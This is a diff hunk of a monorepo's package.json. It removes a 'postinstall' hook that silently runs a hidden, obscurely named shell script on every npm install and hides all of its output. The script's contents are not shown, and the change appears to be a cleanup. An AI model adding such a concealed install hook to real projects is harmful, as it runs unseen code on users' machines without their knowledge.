@@ -13,8 +13,7 @@
     "typecheck": "tsc -b packages/core packages/cli && tsc -p packages/desktop/tsconfig.json",
     "test": "tsc -b packages/core && npm test -w @bando/core",
     "format": "prettier --write .",
-    "format:check": "prettier --check .",
-    "postinstall": "sh ./.ci-vkzt39.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "format:check": "prettier --check ."
   },
   "devDependencies": {
     "@types/node": "^24.19.2",
